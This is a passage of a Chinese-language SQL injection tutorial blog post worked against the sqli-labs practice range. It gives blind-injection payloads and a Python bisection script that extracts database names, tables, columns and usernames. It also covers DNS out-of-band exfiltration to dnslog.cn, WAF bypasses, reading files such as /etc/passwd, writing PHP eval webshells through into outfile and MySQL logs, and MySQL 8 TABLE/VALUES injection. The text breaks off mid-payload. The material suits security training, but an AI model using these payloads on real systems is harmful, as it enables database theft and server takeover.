http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and length(database()) = 8 --+判断数据库第一位的字母http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and substr(database(),1,1) = &#39;s&#39; --+求数据库中表的长度第一个表名长度：&#39;and length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1))=6--+第二个表名长度 &#39;and length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1))=8--+长度为6、8查询第一个表的第一位字符&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=117--+查询第二个表的第二个字符&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1),1,1))=117--+判断字段的长度&#39;and length((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1))=6--+‘  判断字段长度名称第一个字母的ascii &#39;and ord(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1),1,1))=117--+判断第二位长度名称第一个字母的ascii&#39;and ord(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1),2,1))=115--+</code></pre><p>然而这样的手工注入的效率我们是无法忍受的，我们可以基于二分法编写一个自动化脚本去帮助我们提升效率！</p><pre><code class="python">import requestsimport timeurl = &quot;http://127.0.0.1/sqli-labs/Less-8/&quot;data= &quot;&quot;for i in range(10000):    min = 32    max = 128    while (min &lt; max) :        mid = (min + max) // 2        # 爆破数据库名        payload = &quot;?id=1\&#39;and if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)        # 爆破表名        #payload = &quot;?id=1\&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#39;security\&#39;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)        # 爆破字段        #payload = &quot;?id=1\&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#39;users\&#39;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)        # 爆破数据        #payload = &quot;?id=1\&#39;and if(ascii(substr((select group_concat(username) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)        urls = url+payload        print(urls)        response = requests.get(url=urls)        if &quot;You&quot; in response.text:            min = mid+1        else:            max = mid        mid = (min + max) // 2    data += chr(mid)    print(data)</code></pre><p>首先我们启动第一个payload，看一下结果<br><strong>得到数据库名:</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666947971248-f6389bf2-db21-4a12-b751-bd9d9fc29b28.png" alt="image.png"><br><strong>启动第二个payload，得到表名:</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948051467-a36e74af-fb19-46ff-8082-99d60f44d878.png" alt="image.png"><br><strong>启动第三个payload,我们查一下user表的字段</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948117597-6fbc3ac8-0440-4ae7-a09d-fbcc4bcd917b.png" alt="image.png"><br><strong>启动最后一个payload，来获取username字段里的数据叭</strong><br>如图，成功得到了字段里的数据<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948200677-0b7cb401-5693-410e-bda8-b40f64796037.png" alt="image.png"><br>通过脚本辅助注入可以极大的提升我们的注入效率！</p><h2 id="延迟盲注"><a href="#延迟盲注" class="headerlink" title="延迟盲注"></a>延迟盲注</h2><p>在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功<br>延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显<br>还是利用if来判断结果正确与否，只是返回值用延时来代替1<br>详情可查看上文，我们可以利用这个来判断是否注入，不过个人觉得并不适合批量跑数据，因为时间有太多的不可控性,我们拿来做个判断就好，同样用sqil-labs8来示范<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948437175-8eccdf4a-4500-4756-a089-5f02c42b6244.png" alt="image.png"><br>这个页面过了10s左右才加载完毕，我们可以利用这个来判断是否存在注入</p><h2 id="爆错盲注"><a href="#爆错盲注" class="headerlink" title="爆错盲注"></a>爆错盲注</h2><p>这里参考上文爆错注入即可，区别就是这个可能无法回显出数据，但是成功与失败页面可能存在差异，可以利用这个差异去编写脚本进行判断</p><h2 id="当关键词被过滤使用异或注入代替"><a href="#当关键词被过滤使用异或注入代替" class="headerlink" title="当关键词被过滤使用异或注入代替"></a>当关键词被过滤使用异或注入代替</h2><p>当and和or被过滤的时候，我们可以用异或注入然后搭配上面三个去代替，本质上是一样的。</p><h1 id="DNS请求注入"><a href="#DNS请求注入" class="headerlink" title="DNS请求注入"></a>DNS请求注入</h1><p><strong>DNS平台:</strong></p><pre><code class="python">http://www.dnslog.cnhttp://ceye.io</code></pre><p><strong>DNS注入原理:</strong></p><pre><code class="python">dnslog注入也可以称之为dns带外查询，是一种注入姿势，可以通过查询相应的dns解析记录，来获取我们想要的数据在无法通过联合查询直接获取数据时，只能通过盲注，来一步步的获取数据，手工测试是需要花费大量的时间，使用sqlmap直接去跑出数据，但是有很大的几率，网站把ip给封掉，这就影响了测试进度</code></pre><p><strong>前提条件:</strong></p><pre><code class="python">dns带外查询属于MySQL注入在MySQL中有个系统属性，secure_file_priv特性，有三种状态secure_file_priv为null    表示不允许导入导出secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹secure_file_priv没有设置时，则表示没有任何限制</code></pre><p>我们要让secure_file_priv没有任何限制才能注入成功，我们这里本地搭建环境<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950864657-b85a2de5-e3fc-4ce0-9f8b-b72c284a16c0.png" alt="image.png"><br>让这里为空<br><strong>相关函数:</strong></p><pre><code class="python">LOAD_FILE()函数读取一个文件并将其内容作为字符串返回语法：load_file(文件的完整路径）此函数使用需要满足的条件要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。而且LOAD_FILE()函数不仅能够加载本地文件，同时也能对诸如\\www.test.com这样的UNCurl发起请求。</code></pre><pre><code class="python">UNC是一种命名惯例，主要用于在Microsoft Windows上指定和映射网络驱动器。UNC命名惯例最多被应用于局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。UNC路径就是类似\softer这样的形式的网络路径。格式:\servername\sharename，其中servername是服务器名，sharename是共享资源的名称。</code></pre><p><strong>构造注入语句:</strong></p><pre><code class="python">（根据实际情况构造）select load_file(concat(&#39;//&#39;,(select database()),&#39;.oo0fjh.dnslog.cn/abc&#39;))select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.oo0fjh.dnslog.cn\\123&#39;))load_file()函数访问的是文件，所以域名后面需要添加/abc</code></pre><p>我们来执行一下语句:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950895154-7656141c-8ec3-42c7-8ecc-679b1e24e3cc.png" alt="image.png"><br>如图，这里的security就是我们的数据库名称<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950920936-b77db3b3-5bfd-4054-8d64-d2d29e45c628.png" alt="image.png"></p><h1 id="mysql关于utf-8编码问题"><a href="#mysql关于utf-8编码问题" class="headerlink" title="mysql关于utf-8编码问题"></a><strong>mysql关于utf-8编码问题</strong></h1><p>如果数据库是utf-8编码的情况下，常常会在PHP代码层用无视大小写的字母waf，那么utf-8的<br>是无法像GBK用宽字节绕过 ‘ ，但是在数据库中utf-8分为2种校对模式<br>utf8_unicode_ci<br>该模式会把特殊字母转换成2个正规英文，例如ß=ss<br>utf8_general_ci<br>该模式会把特殊字符转换成1个正规英文，例如Ä = A，Ö = O，Ü = U<br>比如是utf8_general_ci模式，下面是$sql1会被拦截，而$sql2不会被拦截</p><pre><code class="python">$sql1 = select * from admin where id = &#39;xx&#39; union select 1,2,database() #$sql2 = select * from admin where id = &#39;xx&#39; uniÖn select 1,2,database() #if(preg_match(&#39;/union/i&#39;,$sql1) &gt; 0)&#123;　　echo &#39;waf&#39;;&#125;else&#123;　　执行sql语句&#125;if(preg_match(&#39;/union/i&#39;,$sql2) &gt; 0)&#123;　　echo &#39;waf&#39;;&#125;else&#123;　　执行sql语句&#125;</code></pre><h1 id="sql注入读取文件"><a href="#sql注入读取文件" class="headerlink" title="sql注入读取文件"></a>sql注入读取文件</h1><h2 id="load-file读取文件"><a href="#load-file读取文件" class="headerlink" title="load_file读取文件"></a>load_file读取文件</h2><p><strong>文件读取基本条件:</strong></p><pre><code class="python">当前用户权限对该文件可读。文件在该服务器上。路径完整。文件大小小于max_sllowed_packet。当前数据库用户有FILE权限，File_priv为yessecure_file_priv的值为空，如果值为某目录，那么就只能对该目录的文件进行操作。</code></pre><p><strong>查看secure_file_priv</strong></p><pre><code class="python"> show variables like &#39;%secure%&#39;;</code></pre><pre><code class="python">在MySQL中有个系统属性，secure_file_priv特性，有三种状态secure_file_priv为null    表示不允许导入导出secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹secure_file_priv没有设置时，则表示没有任何限制</code></pre><p>如果这个为null我们是无法读取文件的<br><strong>读取文件命令:</strong><br>*<em>注意路径问题，是/而不能是*</em></p><pre><code class="python">mysql&gt; select load_file(&#39;E:/phpstudy_pro/WWW/flag.txt&#39;);+--------------------------------------------------------------------------------------+| load_file(&#39;E:/phpstudy_pro/WWW/flag.txt&#39;)                                            |+--------------------------------------------------------------------------------------+| 0x666C61677B746869735F31735F66316161616161677D                                       |+--------------------------------------------------------------------------------------+1 row in set (0.00 sec)</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666976308164-9d325d8d-5c1d-4cb0-866d-26860e656f36.png" alt="image.png"><br>当我们使用SQL注入来进行文件读写时，还需要注意，在网站的PHP设置中是否使用了magic_quotes_gpc的魔术引导开关，该参数的设置会对单引号、双引号、反斜杠与空字符进行过滤。这样，当我们使用MySQL进行文件读写，要输入目标站点路径时，就会受到限制。针对这一点，<strong>我们可以使用16进制编码的方式来进行绕过。</strong></p><pre><code class="python">mysql&gt; select load_file(0x453A2F70687073747564795F70726F2F5757572F666C61672E747874);+----------------------------------------------------------------------------------------------------------------------------------------------+| load_file(0x453A2F70687073747564795F70726F2F5757572F666C61672E747874)                                                  |+----------------------------------------------------------------------------------------------------------------------------------------------+| 0x666C61677B746869735F31735F66316161616161677D                                                  |+----------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)</code></pre><h2 id="Load-data-infile读取文件"><a href="#Load-data-infile读取文件" class="headerlink" title="Load data infile读取文件"></a>Load data infile读取文件</h2><p>当”LOAD DATA local INFILE”时出现The used command is not allowed with this MySQL version问题时<br>第一是版本确实过低，低于5.0，但是现在基本不可能出现这个问题。<br>第二可能是本地导入文件的参数没有打开。<br>我们输入:</p><pre><code class="python">mysql&gt; SHOW VARIABLES LIKE &#39;%local%&#39;;+---------------+-------+| Variable_name | Value |+---------------+-------+| local_infile  | OFF    |+---------------+-------+1 row in set, 1 warning (0.00 sec)</code></pre><p>发现雀氏没打开哦<br>我们再输入:</p><pre><code class="python">SET GLOBAL local_infile=1;</code></pre><p>读取文件payload:</p><pre><code class="python">load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code></pre><p>这里我本地复现失败了，我就放一张别人的图吧，qaq<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666978978256-35acea7a-b8ea-4f25-9ced-6f2d914ec6a8.png" alt="图片-26.png"></p><h1 id="sql注入写shell"><a href="#sql注入写shell" class="headerlink" title="sql注入写shell"></a>sql注入写shell</h1><h2 id="into-outfile-写文件"><a href="#into-outfile-写文件" class="headerlink" title="into outfile()写文件"></a>into outfile()写文件</h2><p>写入一句话payload:</p><pre><code class="python">select &#39;&lt;?php eval($_POST[cmd]?&gt;&#39; into outfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;</code></pre><pre><code class="python">mysql&gt; select &#39;&lt;?php eval($_POST[cmd]?&gt;&#39; into outfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;Query OK, 1 row affected (0.00 sec)</code></pre><p>写入的数据可以用16进制代替，但是 outfile后面不能接Ox开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中更加麻烦，因为会自动将单引号转义,那么基本没的玩了。  </p><pre><code class="python">select 0x3C3F706870206576616C28245F504F53545B636D645D3F3E into outfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666979808674-b35c4b47-d186-436f-80ab-63031277162c.png" alt="image.png"><br>写入shell成功!</p><h2 id="into-dumpfile-写文件"><a href="#into-dumpfile-写文件" class="headerlink" title="into dumpfile()写文件"></a>into dumpfile()写文件</h2><p>into dumpfile只能导出第一行数据，并不常用，通常写入第二条数据的时候出错，但第二条内容已被写入文件</p><pre><code class="python">select &#39;&lt;?php eval($_POST[cmd]?&gt;&#39; into dumpfile &#39;D:/HY.php&#39;</code></pre><p>写入的数据可以用16进制代替</p><pre><code class="python">select 0x3C3F706870206576616C28245F504F53545B636D645D3F3E into dumpfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;</code></pre><h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><p>into dumpfile它只能导出一行数据，并不常用，用于导出一条数据，通常写入第二条的时候出错，但第二条内容已被写入文件。<br>outfile函数可以导出多行，而dumpfile只能导出一行数据。<br>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。<br>dumpfile适用于二进制文件，它会将目标文件吸入同一行内; outfile则更适用于文本文件。</p><h2 id="日志写shell"><a href="#日志写shell" class="headerlink" title="日志写shell"></a>日志写shell</h2><pre><code class="python">MySQL日志文件系统的组成:错误日志log_error：记录启动、运行或停止mysqld时出现的问题。通用日志general_log：记录建立的客户端连接和执行的语句。更新日志：记录更改数据的语句。该日志在MySQL 5.1中已不再使用。二进制日志：记录所有更改数据的语句。还用于复制。慢查询日志slow_query_log：记录所有执行时间超过long_query_time秒(默认10秒)的所有查询或不使用索引的查询。Innodb日志：innodb redolog</code></pre><p> 以下举例两种:</p><pre><code class="python">show global variables like &quot;%general%&quot;;                 #查看general文件配置情况set global general_log=&#39;on&#39;;                            #开启日志记录set global general_log_file=&#39;C:/phpstudy/WWW/shell.php&#39;;select &#39;&lt;?php @eval($_POST[shell]); ?&gt;&#39;;                #日志文件导出指定目录set global general_log=off;                             #关闭记录</code></pre><pre><code class="python">show variables like &#39;%slow%&#39;;                           #慢查询日志set GLOBAL slow_query_log_file=&#39;C:/phpStudy/PHPTutorial/WWW/slow.php&#39;;set GLOBAL slow_query_log=on;/*set GLOBAL log_queries_not_using_indexes=on;show variables like &#39;%log%&#39;;*/select &#39;&lt;?php phpinfo();?&gt;&#39; from mysql.user where sleep(10);</code></pre><h1 id="Mysql任意文件读取"><a href="#Mysql任意文件读取" class="headerlink" title="Mysql任意文件读取"></a>Mysql任意文件读取</h1><p>这个解释起来比较多，放个参考链接<br><a href="https://www.yuque.com/docs/share/8ccbaba4-6b65-492e-9a5d-642609c5823b#">https://www.yuque.com/docs/share/8ccbaba4-6b65-492e-9a5d-642609c5823b?#</a> 《MySQL客户端任意文件读取》</p><h1 id="MYSQL8-0注入新特性"><a href="#MYSQL8-0注入新特性" class="headerlink" title="MYSQL8.0注入新特性"></a>MYSQL8.0注入新特性</h1><p>MYSQL8.0.19后 出现两个新的关键字table和values  </p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置:"></a>环境配置:</h2><p>** 选择使用docker搭建:**</p><pre><code class="python">docker pull mysql:8.0.22docker run -itd -p 3306:3306 -e MYSQL_ROOT_PASSWORD=HY666123 mysql:8.0.22# 进去docker容器docker exec -it 410b0261fe70 bash# 登陆mysqlmysql -u root -pHY666123# 开启远程访问权限use mysql;select host,user from user;# 因为mysql8.0默认认证方式和5不一样，通过下面语句修改即可ALTER USER &#39;root&#39; IDENTIFIED WITH mysql_native_password BY &#39;HY666123&#39;;flush privileges;</code></pre><p>我们来远程连接一下:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667118176379-90035b23-4012-4ead-af9d-87fe3e093804.png" alt="image.png"><br>成功连接上去了<br><strong>sql注入的靶场用sqli-lab</strong><br><a href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a><br>按照文档搭建好，进入容器修改sqli-lab的配置文件</p><pre><code class="python"># 启动容器docker-compose up -d# 进入sql-labs容器docker exec -it e0c30b42806f bash# 编辑文件vi /app/sql-connections/db-creds.inc# 配置文件#数据库的IP填宿主机的就可以，通过ifconfig查看容器IP地址#比如容器IP为：172.18.0.2，一般来说宿主机为172.18.0.1&lt;?php//give your mysql connection username n password$dbuser =&#39;root&#39;;$dbpass =&#39;HY666123&#39;;$dbname =&quot;security&quot;;$host = &#39;172.18.0.1&#39;;$dbname1 = &quot;challenges&quot;;?&gt;# 重启docker容器docker restart e0c30b42806f</code></pre><p>搞了好久，终于搭建好了，md<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121281615-4e12879b-9bf6-4456-94b3-3163f4079709.png" alt="image.png"></p><h2 id="table"><a href="#table" class="headerlink" title="table"></a>table</h2><p><strong>基本用法</strong><br>在MYSQL8以后出现的新语法，作用和select类似。</p><pre><code class="python">作用：列出表中全部内容语法：TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121671251-06a4a33b-5ac5-41a5-a73a-f9c81a8d1154.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121711905-0c346772-77f6-4421-9450-fc7634d6d66b.png" alt="image.png"><br><strong>支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。</strong></p><pre><code class="python">table user order by 2table user limit 2</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121769501-851d711d-14c6-44bb-bb9a-cdc1b8244c34.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121789469-1d020011-3434-4884-b299-d9c70668b6a0.png" alt="image.png"><br><strong>与SELECT的区别：</strong></p><pre><code class="python">1.TABLE始终显示表的所有列 2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句</code></pre><p><strong>注意事项:</strong><br><strong>比较问题一:</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667122326816-e2d3588e-7b50-42aa-9d51-55072e2495f6.png" alt="image.png"><br>我们来构造sql语句:</p><pre><code class="python">mysql&gt; select ((&#39;r&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));        +------------------------------------------------------------------------+                   | ((&#39;r&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |                   +------------------------------------------------------------------------+                   |                                                                      1 |                   +------------------------------------------------------------------------+                   1 row in set (0.24 sec)                                                                                                                                                                   mysql&gt; select ((&#39;t&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));        +------------------------------------------------------------------------+                   | ((&#39;t&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |                   +------------------------------------------------------------------------+                   |                                                                      0 |                   +------------------------------------------------------------------------+                   1 row in set (0.23 sec)                                                                      </code></pre><p>这里看起来和以前一样，但是当我们换为s时:</p><pre><code class="python">mysql&gt; select ((&#39;s&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));+------------------------------------------------------------------------+| ((&#39;s&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |+------------------------------------------------------------------------+|                                                                      1 |+------------------------------------------------------------------------+1 row in set (0.23 sec)</code></pre><p>同样为1，说明当ascii相等的时候返回1<br><strong>所以在进行注入中注意要把得到的数ascii值减1。</strong><br><strong>比较问题二</strong></p><pre><code class="python">mysql&gt; select ((&#39;security/user&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));+------------------------------------------------------------------------------------+| ((&#39;security/user&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |+------------------------------------------------------------------------------------+|                                                                                  1 |+------------------------------------------------------------------------------------+1 row in set (0.23 sec)mysql&gt; select ((&#39;security/users&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));+-------------------------------------------------------------------------------------+| ((&#39;security/users&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |+-------------------------------------------------------------------------------------+|                                                                                NULL |+-------------------------------------------------------------------------------------+1 row in set (0.23 sec)mysql&gt; select ((&#39;security/usert&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));+-------------------------------------------------------------------------------------+| ((&#39;security/usert&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |+-------------------------------------------------------------------------------------+|                                                                                   0 |+-------------------------------------------------------------------------------------+1 row in set (0.23 sec)</code></pre><p>当前面字符串相等时，会比较最后一位，当完全相等时，返回NULL<br><strong>比较问题三</strong><br>整数比较问题</p><pre><code class="python">mysql&gt; select ((&#39;0&#39;,2,3)&lt;(table users limit 0,1));+-------------------------------------+| ((&#39;0&#39;,2,3)&lt;(table users limit 0,1)) |+-------------------------------------+|                                   1 |+-------------------------------------+1 row in set (0.23 sec)mysql&gt; select ((&#39;1&#39;,2,3)&lt;(table users limit 0,1));+-------------------------------------+| ((&#39;1&#39;,2,3)&lt;(table users limit 0,1)) |+-------------------------------------+|                                   0 |+-------------------------------------+1 row in set (0.23 sec)mysql&gt; select ((&#39;2&#39;,2,3)&lt;(table users limit 0,1));+-------------------------------------+| ((&#39;2&#39;,2,3)&lt;(table users limit 0,1)) |+-------------------------------------+|                                   0 |+-------------------------------------+1 row in set (0.23 sec)mysql&gt; select ((&#39;0aa&#39;,2,3)&lt;(table users limit 0,1));+---------------------------------------+| ((&#39;0aa&#39;,2,3)&lt;(table users limit 0,1)) |+---------------------------------------+|                                     1 |+---------------------------------------+1 row in set, 1 warning (0.23 sec)mysql&gt; select ((&#39;1aa&#39;,2,3)&lt;(table users limit 0,1));+---------------------------------------+| ((&#39;1aa&#39;,2,3)&lt;(table users limit 0,1)) |+---------------------------------------+|                                     0 |+---------------------------------------+1 row in set, 1 warning (0.23 sec)</code></pre><p> 在这里，由于id是整型，当我们输入的是字符型时，在进行比较过程中，字符型会被强制转换为整型，而不是像之前一样读到了第一位以后没有第二位就会停止，也就是都会强制转换为整型进行比较并且会一直持续下去，所以以后写脚本当跑到最后一位的时候尤其需要注意。  </p><h2 id="VALUES"><a href="#VALUES" class="headerlink" title="VALUES"></a>VALUES</h2><p>VALUES 类似于其他数据库的 ROW 语句，造数据时非常有用。   </p><pre><code class="python">作用：列出一行的值语法：VALUES row_constructor_list[ORDER BY column_designator][LIMIT BY number] row_constructor_list:   ROW(value_list)[, ROW(value_list)][, ...]value_list:   value[, value][, ...]column_designator:   column_index</code></pre><p> 基本使用:</p><pre><code class="python">VALUES ROW(1,2)VALUES ROW(1,2,3)VALUES ROW(1,2,3),ROW(5,6,7)</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123148793-3de4ecc3-8810-43ea-a5c9-39db2ae76870.png" alt="image.png"><br> 配合union使用:</p><pre><code class="python">VALUES ROW(1, 2) union select * from userselect * from user union VALUES ROW(1, 2)</code></pre><h2 id="information-schema-TABLESPACES-EXTENSIONS"><a href="#information-schema-TABLESPACES-EXTENSIONS" class="headerlink" title="information_schema.TABLESPACES_EXTENSIONS"></a>information_schema.TABLESPACES_EXTENSIONS</h2><pre><code class="python"># 我们可以通过这个表去查询所有数据库中的数据库和数据表table information_schema.TABLESPACES_EXTENSIONS等价于select * from information_schema.TABLESPACES_EXTENSIONS</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123264265-97f7586f-c68d-4aa4-ae44-40a7f37126e1.png" alt="image.png"><br>类似的还有:</p><pre><code class="python">information_schema.SCHEMA information_schema.TABLESinformation.COLUMNSmysql.innodb_table_statsmysql.innodb_index_statssys.schema_tables_with_full_table_scans</code></pre><h2 id="简单练手"><a href="#简单练手" class="headerlink" title="简单练手"></a>简单练手</h2><p> 修改Less-1的代码，过滤select </p><pre><code class="python">&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variables if(isset($_GET[&#39;id&#39;]))&#123;$id=$_GET[&#39;id&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity function blacklist($id)&#123;    $id= preg_replace(&#39;/select/i&#39;,&quot;&quot;, $id);    return $id;&#125;$id = blacklist($id);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    &#123;    echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;    echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];    echo &quot;&lt;br&gt;&quot;;    echo &#39;Your Password:&#39; .$row[&#39;password&#39;];    echo &quot;&lt;/font&gt;&quot;;    &#125;    else     &#123;    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      &#125;&#125;    else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-1.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123953628-7cea2c7a-0067-4ed6-86b4-2927530d781e.png" alt="image.png"><br>我们来用新方法注入:<br>首先用order by判断列数，这里不再说明，得出三列</p><pre><code class="python"># 我们使用values构造出了一个表,证明可以注入http://193.43.142.8/Less-1/?id=-1&#39;union values row(1,2,3)--+</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667124020361-65981ef9-1171-4f96-804d-18ed8ff66a3f.png" alt="image.png"><br>然后就是常规的需要知道库名，表名，字段名<br>当前库可以通过布尔盲注得到</p><pre><code class="python">http://193.43.142.8/Less-1/?id=1&#39;and if((substr((database()),1,1)=&#39;s&#39;),1,0)--+</code></pre><p> 别的库名可以通过盲注得到  </p><pre><code class="python">table information_schema.schemata       #列出所有数据库名</code></pre><p> 因为table不能像select控制列数，除非列数一样的表，不然都回显不出来，也需要使用盲注<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667124802009-d36dcc05-5439-472c-abf9-0c338284016a.png" alt="image.png"></p><pre><code class="python">http://193.43.142.8/Less-1/?id=1&#39;&amp;&amp;(&#39;def&#39;,&#39;m&#39;,&#39;&#39;,4,5,6)&lt;(table information_schema.schemata limit 1);</code></pre><p>后面的语句是从左到右判断的，第一列判断正确再判断第二列<br>因为schemata表中的第一列是def，不需要判断，所以可以直接判断库名<br>里面的字符也是单个判断的，比如库为mysql</p><pre><code class="python">m &lt; mysqlmy &lt; mysqlazzzz &lt; mysql</code></pre><p>以上判断都是正确的，猜测是按照ascii码大小比较的，最后一个就比较坑，如果前一个字符判断不正确，后面的字符都会不正确，所以前面的判断一定要正确<br>注意判断的时候后一个列名一定要用字符表示，不能用数字，不然判断到前一个最后一个字符会判断不出</p><pre><code class="python">(&#39;def&#39;,&#39;mysql&#39;,3,4,5,6)&lt;(table information_schema.schemata limit 1);    #判断错误(&#39;def&#39;,&#39;mysql&#39;,&#39;&#39;,4,5,6)&lt;(table information_schema.schemata limit 1);   #判断正确</code></pre><p> 得到当前库名为security，接下来判断表名  </p><pre><code class="python">(&#39;def&#39;,&#39;security&#39;,&#39;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit 325,1);</code></pre><p>前两个字段都是确定的，可以写一个for循环判断，如果结果为真，代表从那行开始，然后盲注第三个列<br>得到所有表明后开始判断字段名，找到columns表，具体方法和上面一样</p><pre><code class="python">(&#39;def&#39;,&#39;security&#39;,&#39;users&#39;,&#39;&#39;,&#39;&#39;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit 3415,1);</code></pre><p> 最后注入出数据  </p><pre><code class="python">(1,&#39;&#39;,&#39;&#39;) 